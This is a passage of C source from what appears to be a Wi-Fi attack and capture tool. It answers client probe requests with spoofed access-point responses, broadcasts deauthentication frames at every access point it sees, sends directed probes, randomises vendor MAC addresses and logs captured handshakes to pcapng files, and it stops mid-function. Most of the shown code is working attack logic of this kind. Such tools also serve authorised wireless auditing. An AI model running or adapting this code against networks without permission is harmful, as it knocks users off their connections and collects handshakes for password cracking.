0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x6f, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
0x10, 0x3b, 0x00, 0x01, 0x03, 0x10, 0x47, 0x00, 0x10, 0xd5, 0x6c, 0x63, 0x68, 0xb0, 0x16, 0xf7,
0xc3, 0x09, 0x22, 0x34, 0x81, 0xc4, 0xe7, 0x99, 0x1b, 0x10, 0x21, 0x00, 0x03, 0x41, 0x56, 0x4d,
0x10, 0x23, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x24, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30,
0x10, 0x42, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30, 0x10, 0x54, 0x00, 0x08, 0x00, 0x06, 0x00, 0x50,
0xf2, 0x04, 0x00, 0x01, 0x10, 0x11, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x08, 0x00, 0x02,
0x23, 0x88, 0x10, 0x3c, 0x00, 0x01, 0x01, 0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01,
0x20
};
#define PROBERESPONSE_SIZE sizeof(proberesponsedata)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macfrx->addr2) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macfrx->addr2) == false))
	{
	return;
	}
if(checkpownedstaap(macfrx->addr2, macap) == true)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +ESSID_LEN_MAX +IETAG_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->sequence = myproberesponsesequence++ << 4;
if(myproberesponsesequence >= 4096)
	{
	myproberesponsesequence = 0;
	}
capap = (capap_t*)(packetout +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime;
capap->beaconintervall = 0x640;
capap->capabilities = 0x431;

essidtag = (ietag_t*)essidtagptr;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = essidtag->len;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], essidtag->data, essidtag->len);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +essidtag->len +IETAG_SIZE], &proberesponsedata, PROBERESPONSE_SIZE);
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +essidtag->len +IETAG_SIZE +0x0c] = channelscanlist[cpa];
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +essidtag->len +IETAG_SIZE +PROBERESPONSE_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void getnewmac(uint8_t *newapmac, uint8_t *essidtagptr)
{
int c;
static macessidlist_t *zeiger;
static ietag_t *essidtag;

essidtag = (ietag_t*)essidtagptr;
zeiger = myproberesponselist;
for(c = 0; c < MYPROBERESPONSELIST_MAX -1; c++)
		{
		if(memcmp(zeiger->addr, &mac_null, 6) == 0)
			{
			break;
			}
		if((zeiger->essid_len == essidtag->len) && (memcmp(zeiger->essid, essidtag->data, essidtag->len) == 0))
			{
			memcpy(newapmac, zeiger->addr, 6);
			zeiger->timestamp = timestamp;
			return;
			}
		zeiger++;
		}
zeiger->status = 0;
zeiger->timestamp = timestamp;
mynicap++;
zeiger->addr[5] = mynicap & 0xff;
zeiger->addr[4] = (mynicap >> 8) & 0xff;
zeiger->addr[3] = (mynicap >> 16) & 0xff;
zeiger->addr[2] = myouiap & 0xff;
zeiger->addr[1] = (myouiap >> 8) & 0xff;
zeiger->addr[0] = (myouiap >> 16) & 0xff;
memcpy(newapmac, zeiger->addr, 6);
zeiger->essid_len = essidtag->len;
memset(zeiger->essid, 0, ESSID_LEN_MAX);
memcpy(zeiger->essid, essidtag->data, essidtag->len);
qsort(myproberesponselist, c +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211probe_req()
{
static int c;
static uint8_t *essidtagptr;
static ietag_t *essidtag;
static macessidlist_t *zeiger;

uint8_t sendmac[6];

if(memcmp(&mac_mysta, macfrx->addr2, 6) == 0)
	{
	return;
	}

if(payload_len < (int)IETAG_SIZE)
	{
	return;
	}
essidtagptr = gettag(TAG_SSID, payload_ptr, payload_len);
if(essidtagptr == NULL)
	{
	return;
	}

essidtag = (ietag_t*)essidtagptr;
if((essidtag->len == 0) || (essidtag->data[0] == 0))
	{
	return;
	}
if(attackclientflag == false)
	{
	if(memcmp(macfrx->addr1, &mac_broadcast, 6) != 0)
		{
		send_proberesponse(macfrx->addr1, essidtagptr);
		}
	else
		{
		getnewmac(sendmac, essidtagptr);
		send_proberesponse(sendmac, essidtagptr);
		}
	}
zeiger = proberequestlist;
for(c = 0; c < PROBEREQUESTLIST_MAX -1; c++)
	{
	if(memcmp(zeiger->addr, &mac_null, 6) == 0)
		{
		break;
		}
	if((memcmp(zeiger->addr, macfrx->addr1, 6) == 0) && (zeiger->essid_len == essidtag->len) && (memcmp(zeiger->essid, essidtag->data, essidtag->len) == 0))
		{
		zeiger->timestamp = timestamp;
		return;
		}
	zeiger++;
	}
zeiger->timestamp = timestamp;
memcpy(zeiger->addr, macfrx->addr1, 6);
zeiger->essid_len = essidtag->len;
memset(zeiger->essid, 0, 0xff);
memcpy(zeiger->essid, essidtag->data, essidtag->len);
qsort(proberequestlist, c +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);

if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
if((statusout & STATUS_PROBES) == STATUS_PROBES)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	printessid(essidtagptr);
	fprintf(stdout, " [PROBEREQUEST, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
return;
}
/*===========================================================================*/
static inline void process80211beacon()
{
int c;
maclist_t *zeiger;

if(payload_len < (int)CAPABILITIESAP_SIZE)
	{
	return;
	}
if(memcmp(&mac_mybcap, macfrx->addr2, 6) == 0)
	{
	return;
	}

zeiger = beaconlist;
for(c = 0; c < BEACONLIST_MAX -1; c++)
	{
	if(memcmp(zeiger->addr, &mac_null, 6) == 0)
		{
		break;
		}
	if(memcmp(zeiger->addr, macfrx->addr2, 6) == 0)
		{
		zeiger->timestamp = timestamp;
		if(((zeiger->count %deauthenticationintervall) == 0) && (zeiger->count < (deauthenticationsmax *deauthenticationintervall)))
			{
			if(deauthenticationflag == false)
				{
				send_broadcast_deauthentication(WLAN_REASON_UNSPECIFIED);
				}
			}
		if(((zeiger->count %apattacksintervall) == 0) && (zeiger->count < (apattacksmax *apattacksintervall)))
			{
		if(attackapflag == false)
				{
				send_directed_proberequest();
				}
			}
		zeiger->count ++;
		return;
		}
	zeiger++;
	}

zeiger->timestamp = timestamp;
zeiger->status = 0;
zeiger->count = 0;
memcpy(zeiger->addr, macfrx->addr2, 6);
if(deauthenticationflag == false)
	{
	send_broadcast_deauthentication(WLAN_REASON_UNSPECIFIED);
	send_broadcast_deauthentication(WLAN_REASON_UNSPECIFIED);
	zeiger->count = 2;
	}
if(attackapflag == false)
	{
	send_directed_proberequest();
	}
qsort(beaconlist, c +1, MACLIST_SIZE, sort_maclist_by_time);
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void programmende(int signum)
{
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL))
	{
	wantstopflag = true;
	}
return;
}
/*===========================================================================*/
#ifdef DOGPIOSUPPORT
static inline void *rpiflashthread()
{
while(1)
	{
	sleep(5);
	if(digitalRead(7) == 1)
		{
		digitalWrite(0, HIGH);
		wantstopflag = true;
		}
	if(wantstopflag == false)
		{
		digitalWrite(0, HIGH);
		delay (25);
		digitalWrite(0, LOW);
		delay (25);
		}
	}
return NULL;
}
#endif
/*===========================================================================*/
static bool set_channel()
{
static struct iwreq pwrq;

memset(&pwrq, 0, sizeof(pwrq));
strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ -1);
pwrq.u.freq.e = 0;
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.m = channelscanlist[cpa];
if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) == -1)
	{
	return false;
	}
return true;
}
/*===========================================================================*/
static void *channelswitchthread()
{
while(1)
	{
	sleep(staytime);
	channelchangedflag = true;
	}
return NULL;
}
/*===========================================================================*/
static inline void processpackets()
{
int c;
struct sockaddr_ll ll;
socklen_t fromlen;
static rth_t *rth;
int fdnum;
fd_set readfds;
struct timeval tvfd;

uint8_t lastaddr1proberequest[6];
uint8_t lastaddr2proberequest[6];
uint16_t lastsequenceproberequest;

uint8_t lastaddr1proberesponse[6];
uint8_t lastaddr2proberesponse[6];
uint16_t lastsequenceproberesponse;

uint8_t lastaddr1authentication[6];
uint8_t lastaddr2authentication[6];
uint16_t lastsequenceauthentication;

uint8_t lastaddr1associationrequest[6];
uint8_t lastaddr2associationrequest[6];
uint16_t lastsequenceassociationrequest;

uint8_t lastaddr1associationresponse[6];
uint8_t lastaddr2associationresponse[6];
uint16_t lastsequenceassociationresponse;

uint8_t lastaddr1reassociationrequest[6];
uint8_t lastaddr2reassociationrequest[6];
uint16_t lastsequencereassociationrequest;

uint8_t lastaddr1reassociationresponse[6];
uint8_t lastaddr2reassociationresponse[6];
uint16_t lastsequencereassociationresponse;

uint8_t lastaddr1data[6];
uint8_t lastaddr2data[6];
uint16_t lastsequencedata;

memset(&lastaddr1proberequest, 0, 6);
memset(&lastaddr2proberequest, 0, 6);
lastsequenceproberequest = 0;

memset(&lastaddr1proberesponse, 0, 6);
memset(&lastaddr2proberesponse, 0, 6);
lastsequenceproberesponse = 0;

memset(&lastaddr1authentication, 0, 6);
memset(&lastaddr2authentication, 0, 6);
lastsequenceauthentication = 0;

memset(&lastaddr1associationrequest, 0, 6);
memset(&lastaddr2associationrequest, 0, 6);
lastsequenceassociationrequest = 0;

memset(&lastaddr1associationresponse, 0, 6);
memset(&lastaddr2associationresponse, 0, 6);
lastsequenceassociationresponse = 0;

memset(&lastaddr1reassociationrequest, 0, 6);
memset(&lastaddr2reassociationrequest, 0, 6);
lastsequencereassociationrequest = 0;

memset(&lastaddr1reassociationresponse, 0, 6);
memset(&lastaddr2reassociationresponse, 0, 6);
lastsequencereassociationresponse = 0;

memset(&lastaddr1data, 0, 6);
memset(&lastaddr2data, 0, 6);
lastsequencedata = 0;
if(activescanflag == false)
	{
	send_broadcastbeacon();
	send_undirected_proberequest();
	}

printf("\e[?25l\nstart capturing (stop with ctrl+c)\n"
	"INTERFACE:...............: %s\n"
	"FILTERLIST...............: %d entries\n"
	"MAC CLIENT...............: %06x%06x (client)\n"
	"MAC ACCESS POINT.........: %06x%06x (start NIC)\n"
	"EAPOL TIMEOUT............: %d\n"
	"REPLAYCOUNT..............: %llu\n"
	"ANONCE...................: ",
	interfacename, filterlist_len, myouista, mynicsta, myouiap, mynicap, eapoltimeout, rcrandom);
	for(c = 0; c < 32; c++)
		{
		printf("%02x", anoncerandom[c]);
		}
printf("\n\n");
gettimeofday(&tv, NULL);
timestamp = (tv.tv_sec * 1000000) + tv.tv_usec;
timestampstart = timestamp;
set_channel();
channelchangedflag = false;
send_broadcastbeacon();
send_undirected_proberequest();

tvfd.tv_sec = 1;
tvfd.tv_usec = 0;
while(1)
	{
	if(wantstopflag == true)
		{
		globalclose();
		}
	if(channelchangedflag == true)
		{
		cpa++;
		if(channelscanlist[cpa] == 0)
			{
			cpa = 0;
			}
		if(set_channel() == true)
			{
			if(activescanflag == false)
				{
				send_broadcastbeacon();
				send_undirected_proberequest();
				}
			}
		else
			{
			errorcount++;
			}
		channelchangedflag = false;
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	fdnum = select(fd_socket +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	else if(fdnum > 0 && FD_ISSET(fd_socket, &readfds))
		{
		memset(&ll, 0, sizeof(ll));
		fromlen = sizeof(ll);
		packet_len = recvfrom(fd_socket, &epb[EPB_SIZE], PCAPNG_MAXSNAPLEN, 0 ,(struct sockaddr*) &ll, &fromlen);
		if(packet_len < 0)
			{
			perror("\nfailed to read packet");
			errorcount++;
			continue;
			}
		if(ll.sll_pkttype == PACKET_OUTGOING)
			{
			continue;
			}
		if(ioctl(fd_socket, SIOCGSTAMP , &tv) < 0)
			{
			errorcount++;
			continue;
			}
		timestamp = (tv.tv_sec * 1000000) + tv.tv_usec;
		incommingcount++;
		}
	else
		{
		tvfd.tv_sec = 5;
		tvfd.tv_usec = 0;
		if((statusout) > 0)
			{
			printf("\33[2K\rINFO: cha=%d, rx=%llu, rx(dropped)=%llu, tx=%llu, powned=%llu, err=%d", channelscanlist[cpa], incommingcount, droppedcount, outgoingcount, pownedcount, errorcount);
			}
		if(errorcount >= maxerrorcount)
			{
			fprintf(stderr, "\nmaximum number of errors is reached\n");
			globalclose();
			}
		continue;
		}
	if(packet_len < (int)RTH_SIZE +(int)MAC_SIZE_ACK)
		{
		droppedcount++;
		continue;
		}
	packet_ptr = &epb[EPB_SIZE];
	rth = (rth_t*)packet_ptr;
	ieee82011_ptr = packet_ptr +le16toh(rth->it_len);
	ieee82011_len = packet_len -le16toh(rth->it_len);
	macfrx = (mac_t*)ieee82011_ptr;
	if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
		{
		payload_ptr = ieee82011_ptr +MAC_SIZE_LONG;
		payload_len = ieee82011_len -MAC_SIZE_LONG;
		}
	else
		{
		payload_ptr = ieee82011_ptr +MAC_SIZE_NORM;
		payload_len = ieee82011_len -MAC_SIZE_NORM;
		}

	if(macfrx->type == IEEE80211_FTYPE_MGMT)
		{
		if(macfrx->subtype == IEEE80211_STYPE_BEACON)
			{
			process80211beacon();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_PROBE_REQ)
			{
			if((macfrx->sequence == lastsequenceproberequest) && (memcmp(macfrx->addr1, &lastaddr1proberequest, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2proberequest, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequenceproberequest = macfrx->sequence;
			memcpy(&lastaddr1proberequest, macfrx->addr1, 6);
			memcpy(&lastaddr2proberequest, macfrx->addr2, 6);
			process80211probe_req();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP)
			{
			if((macfrx->sequence == lastsequenceproberesponse) && (memcmp(macfrx->addr1, &lastaddr1proberesponse, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2proberesponse, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequenceproberesponse = macfrx->sequence;
			memcpy(&lastaddr1proberesponse, macfrx->addr1, 6);
			memcpy(&lastaddr2proberesponse, macfrx->addr2, 6);
			process80211probe_resp();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_AUTH)
			{
			if((macfrx->sequence == lastsequenceauthentication) && (memcmp(macfrx->addr1, &lastaddr1authentication, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2authentication, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequenceauthentication = macfrx->sequence;
			memcpy(&lastaddr1authentication, macfrx->addr1, 6);
			memcpy(&lastaddr2authentication, macfrx->addr2, 6);
			process80211authentication();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_ASSOC_REQ)
			{
			if((macfrx->sequence == lastsequenceassociationrequest) && (memcmp(macfrx->addr1, &lastaddr1associationrequest, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2associationrequest, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequenceassociationrequest = macfrx->sequence;
			memcpy(&lastaddr1associationrequest, macfrx->addr1, 6);
			memcpy(&lastaddr2associationrequest, macfrx->addr2, 6);
			process80211association_req();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_ASSOC_RESP)
			{
			if((macfrx->sequence == lastsequenceassociationresponse) && (memcmp(macfrx->addr1, &lastaddr1associationresponse, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2associationresponse, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequenceassociationresponse = macfrx->sequence;
			memcpy(&lastaddr1associationresponse, macfrx->addr1, 6);
			memcpy(&lastaddr2associationresponse, macfrx->addr2, 6);
			process80211association_resp();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_REASSOC_REQ)
			{
			if((macfrx->sequence == lastsequencereassociationrequest) && (memcmp(macfrx->addr1, &lastaddr1reassociationrequest, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2reassociationrequest, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequencereassociationrequest = macfrx->sequence;
			memcpy(&lastaddr1reassociationrequest, macfrx->addr1, 6);
			memcpy(&lastaddr2reassociationrequest, macfrx->addr2, 6);
			process80211reassociation_req();
			continue;
			}
		if(macfrx->subtype == IEEE80211_STYPE_REASSOC_RESP)
			{
			if((macfrx->sequence == lastsequencereassociationresponse) && (memcmp(macfrx->addr1, &lastaddr1reassociationresponse, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2reassociationresponse, 6) == 0))
				{
				droppedcount++;
				continue;
				}
			lastsequencereassociationresponse = macfrx->sequence;
			memcpy(&lastaddr1reassociationresponse, macfrx->addr1, 6);
			memcpy(&lastaddr2reassociationresponse, macfrx->addr2, 6);
			process80211reassociation_resp();
			continue;
			}
		continue;
		}
	if(macfrx->type == IEEE80211_FTYPE_CTL)
		{
		continue;
		}
	if(macfrx->type == IEEE80211_FTYPE_DATA)
		{
		if((macfrx->sequence == lastsequencedata) && (memcmp(macfrx->addr1, &lastaddr1data, 6) == 0) && (memcmp(macfrx->addr2, &lastaddr2data, 6) == 0))
			{
			droppedcount++;
			continue;
			}
		lastsequencedata = macfrx->sequence;
		memcpy(&lastaddr1data, macfrx->addr1, 6);
		memcpy(&lastaddr2data, macfrx->addr2, 6);
		if((macfrx->subtype & IEEE80211_STYPE_QOS_DATA) == IEEE80211_STYPE_QOS_DATA)
			{
			payload_ptr += QOS_SIZE;
			payload_len -= QOS_SIZE;
			}
		if( macfrx->subtype == IEEE80211_STYPE_NULLFUNC)
			{
			continue;
			}
		if(payload_len < (int)LLC_SIZE)
			{
			continue;
			}
		llc_ptr = payload_ptr;
		llc = (llc_t*)llc_ptr;
		if(((ntohs(llc->type)) == LLC_TYPE_AUTH) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
			{
			process80211eap();
			continue;
			}
		if(((ntohs(llc->type)) == LLC_TYPE_IPV4) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
			{
			if(fd_ippcapng != 0)
				{
				writeepb(fd_ippcapng);
				}
			continue;
			}
		if(((ntohs(llc->type)) == LLC_TYPE_IPV6) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
			{
			if(fd_ippcapng != 0)
				{
				writeepb(fd_ippcapng);
				}
			continue;
			}
		if(macfrx->protected ==1)
			{
			if(fd_weppcapng != 0)
				{
				mpdu_ptr = payload_ptr;
				mpdu = (mpdu_t*)mpdu_ptr;
				if(((mpdu->keyid >> 5) &1) == 0)
					{
					writeepb(fd_weppcapng);
					}
				}
			continue;
			}
		continue;
		}
	}
return;
}
/*===========================================================================*/
static inline void dotargetscan()
{
struct sockaddr_ll ll;
socklen_t fromlen;
static rth_t *rth;
int fdnum;
fd_set readfds;
struct timeval tvfd;

set_channel();
while(1)
	{
	if(wantstopflag == true)
		{
		globalclose();
		}
	if(channelchangedflag == true)
		{
		cpa++;
		if(channelscanlist[cpa] == 0)
			{
			cpa = 0;
			}
		if(set_channel() == true)
			{
			if(activescanflag == false)
				{
				send_broadcastbeacon();
				send_undirected_proberequest();
				}
			}
		else
			{
			errorcount++;
			}
		channelchangedflag = false;
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	fdnum = select(fd_socket +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	else if(fdnum > 0 && FD_ISSET(fd_socket, &readfds))
		{
		memset(&ll, 0, sizeof(ll));
		fromlen = sizeof(ll);
		packet_len = recvfrom(fd_socket, &epb[EPB_SIZE], PCAPNG_MAXSNAPLEN, 0 ,(struct sockaddr*) &ll, &fromlen);
		if(packet_len < 0)
			{
			perror("\nfailed to read packet");
			errorcount++;
			continue;
			}
		if(ll.sll_pkttype == PACKET_OUTGOING)
			{
			continue;
			}
		if(ioctl(fd_socket, SIOCGSTAMP , &tv) < 0)
			{
			errorcount++;
			continue;
			}
		timestamp = (tv.tv_sec * 1000000) + tv.tv_usec;
		incommingcount++;
		}
	else
		{
		tvfd.tv_sec = 5;
		tvfd.tv_usec = 0;
		if(errorcount >= maxerrorcount)
			{
			fprintf(stderr, "\nmaximum number of errors is reached\n");
			globalclose();
			}
		continue;
		}
	if(packet_len < (int)RTH_SIZE +(int)MAC_SIZE_ACK)
		{
		continue;
		}
	packet_ptr = &epb[EPB_SIZE];
	rth = (rth_t*)packet_ptr;
	ieee82011_ptr = packet_ptr +le16toh(rth->it_len);
	ieee82011_len = packet_len -le16toh(rth->it_len);
	macfrx = (mac_t*)ieee82011_ptr;
	if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
		{
		payload_ptr = ieee82011_ptr +MAC_SIZE_LONG;
		payload_len = ieee82011_len -MAC_SIZE_LONG;
		}
	else
		{
		payload_ptr = ieee82011_ptr +MAC_SIZE_NORM;
		payload_len = ieee82011_len -MAC_SIZE_NORM;
		}
	if(macfrx->type == IEEE80211_FTYPE_MGMT)
		{
		if(macfrx->subtype == IEEE80211_STYPE_BEACON)
			{
//			process80211rcascan();
			continue;
			}
		 }
	}
return;
}
/*===========================================================================*/
static bool ischannelindefaultlist(int userchannel)
{
int cpd = 0;
while(channeldefaultlist[cpd] != 0)
	{
	if(userchannel == channeldefaultlist[cpd])
		{
		return true;
		}
	cpd++;
	}
return false;
}
/*===========================================================================*/
static inline bool processuserscanlist(char *optarglist)
{
static char *ptr;
static char *userscanlist;

userscanlist = strdupa(optarglist);
cpa = 0;
ptr = strtok(userscanlist, ",");
while(ptr != NULL)
	{
	channelscanlist[cpa] = atoi(ptr);
	if(ischannelindefaultlist(channelscanlist[cpa]) == false)
		{
		return false;
		}
	ptr = strtok(NULL, ",");
	cpa++;
	if(cpa > 127)
		{
		return false;
		}
	}
channelscanlist[cpa] = 0;
cpa = 0;

return true;
}
/*===========================================================================*/
/*===========================================================================*/
static inline size_t chop(char *buffer, size_t len)
{
static char *ptr;

ptr = buffer +len -1;
while(len)
	{
	if (*ptr != '\n')
		break;
	*ptr-- = 0;
	len--;
	}
while(len)
	{
	if (*ptr != '\r')
		break;
	*ptr-- = 0;
	len--;
	}
return len;
}
/*---------------------------------------------------------------------------*/
static inline int fgetline(FILE *inputstream, size_t size, char *buffer)
{
static size_t len;
static char *buffptr;

if(feof(inputstream))
	return -1;
buffptr = fgets (buffer, size, inputstream);
if(buffptr == NULL)
	return -1;
len = strlen(buffptr);
len = chop(buffptr, len);
return len;
}
/*===========================================================================*/
static inline int readfilterlist(char *listname, maclist_t *zeiger)
{
int c;
int len;
static FILE *fh_filter;

static char linein[FILTERLIST_LINE_LEN];

if((fh_filter = fopen(listname, "r")) == NULL)
	{
	printf("opening blacklist failed %s\n", listname);
	return 0;
	}

zeiger = filterlist;
for(c = 0; c < FILTERLIST_MAX; c++)
	{
	if((len = fgetline(fh_filter, FILTERLIST_LINE_LEN, linein)) == -1)
		{
		break;
		}
	if(hex2bin(&linein[0x0], zeiger->addr, 6) == false)
		{
		printf("reading blacklist line %d failed: %s\n", c +1, linein);
		fclose(fh_filter);
		return 0;
		}
	zeiger++;
	}
fclose(fh_filter);
return c;
}
/*===========================================================================*/
static inline bool globalinit()
{
int c;
static int ret;
static pthread_t thread1;

#ifdef DOGPIOSUPPORT
static pthread_t thread2;
#endif

fd_pcapng = 0;
fd_ippcapng = 0;
fd_weppcapng = 0;

errorcount = 0;
incommingcount = 0;
droppedcount = 0;
outgoingcount = 0;

mydisassociationsequence = 0;
mydeauthenticationsequence = 0;
mybeaconsequence = 0;
myproberequestsequence = 0;
myauthenticationrequestsequence = 0;
myauthenticationresponsesequence = 0;
myassociationrequestsequence = 0;
myassociationresponsesequence = 0;
myproberesponsesequence = 0;
myidrequestsequence = 0;

mytime = 0;

#ifdef DOGPIOSUPPORT
if(wiringPiSetup() == -1)
	{
	puts ("wiringPi failed!");
	return false;
	}
pinMode(0, OUTPUT);
pinMode(7, INPUT);
for (c = 0; c < 5; c++)
	{
	digitalWrite(0 , HIGH);
	delay (200);
	digitalWrite(0, LOW);
	delay (200);
	}
#endif

srand(time(NULL));
setbuf(stdout, NULL);

myouiap = myvendorap[rand() %((MYVENDORAP_SIZE /sizeof(int)))];
mynicap = rand() & 0xffffff;
mac_mybcap[5] = mynicap & 0xff;
mac_mybcap[4] = (mynicap >> 8) & 0xff;
mac_mybcap[3] = (mynicap >> 16) & 0xff;
mac_mybcap[2] = myouiap & 0xff;
mac_mybcap[1] = (myouiap >> 8) & 0xff;
mac_mybcap[0] = (myouiap >> 16) & 0xff;

myouista = myvendorsta[rand() %((MYVENDORSTA_SIZE /sizeof(int)))];
mynicsta = rand() & 0xffffff;
mac_mysta[5] = mynicsta &0xff;
mac_mysta[4] = (mynicsta >> 8) &0xff;
mac_mysta[3] = (mynicsta >> 16) &0xff;
mac_mysta[2] = myouista & 0xff;
mac_mysta[1] = (myouista >> 8) &0xff;
mac_mysta[0] = (myouista >> 16) &0xff;

memset(&laststam1, 0, 6);
memset(&lastapm1, 0, 6);
lastrcm1 = 0;
lasttimestampm1 = 0;
memset(&laststam2, 0, 6);
memset(&lastapm2, 0, 6);
lastrcm2 = 0;
lasttimestampm2 = 0;

rcrandom = (rand()%0xfff) +0xf000;
for(c = 0; c < 32; c++)
	{
	anoncerandom[c] = rand() %0xff;
	}

ret = pthread_create(&thread1, NULL, &channelswitchthread, NULL);
if(ret != 0)
	{
	printf("failed to create thread\n");
	return false;
	}

#ifdef DOGPIOSUPPORT
ret = pthread_create(&thread2, NULL, &rpiflashthread, NULL);
if(ret != 0)
	{
	printf("failed to create thread\n");
	return false;
	}
#endif

if((beaconlist = calloc((BEACONLIST_MAX), MACLIST_SIZE)) == NULL)
	{
	return false;
	}

if((proberequestlist = calloc((PROBEREQUESTLIST_MAX), MACESSIDLIST_SIZE)) == NULL)
	{
	return false;
	}

if((proberesponselist = calloc((PROBERESPONSELIST_MAX), MACESSIDLIST_SIZE)) == NULL)
	{
	return false;
	}

if((myproberesponselist = calloc((MYPROBERESPONSELIST_MAX), MACESSIDLIST_SIZE)) == NULL)
	{
	return false;
	}

if((pownedlist = calloc((POWNEDLIST_MAX), MACMACLIST_SIZE)) == NULL)
	{
	return false;
	}


filterlist_len = 0;
filterlist = NULL;
if(filterlistname != NULL)
	{
	if((filterlist = calloc((FILTERLIST_MAX), MACLIST_SIZE)) == NULL)
		{
		return false;
		}
	filterlist_len = readfilterlist(filterlistname, filterlist);
	if(filterlist_len == 0)
		{
		return false;
		}
	}

if(pcapngoutname != NULL)
	{
	fd_pcapng = hcxcreatepcapngdump(pcapngoutname, mac_orig, interfacename, rcrandom, anoncerandom);
	if(fd_pcapng <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", pcapngoutname);
		return false;
		}
	}

if(weppcapngoutname != NULL)
	{
	fd_weppcapng = hcxcreatepcapngdump(weppcapngoutname, mac_orig, interfacename, rcrandom, anoncerandom);
	if(fd_weppcapng <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", weppcapngoutname);
		return false;
		}
	}

if(ippcapngoutname != NULL)
	{
	fd_ippcapng = hcxcreatepcapngdump(ippcapngoutname, mac_orig, interfacename, rcrandom, anoncerandom);
	if(fd_ippcapng <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", ippcapngoutname);
		return false;
		}
	}
wantstopflag = false;
signal(SIGINT, programmende);
return true;
}
/*===========================================================================*/
static inline bool opensocket()
{
static struct ifreq ifr;
static struct sockaddr_ll ll;

if((fd_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	perror( "socket failed (do you have root priviledges?)");
	return false;
	}

memset(&ifr, 0, sizeof(ifr));
strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
ifr.ifr_flags = 0;
if(ioctl(fd_socket, SIOCGIFINDEX, &ifr) < 0)
	{
	perror("failed to get SIOCGIFINDEX");
	close(fd_socket);
	return false;
	}

memset(&ll, 0, sizeof(ll));
ll.sll_family = PF_PACKET;
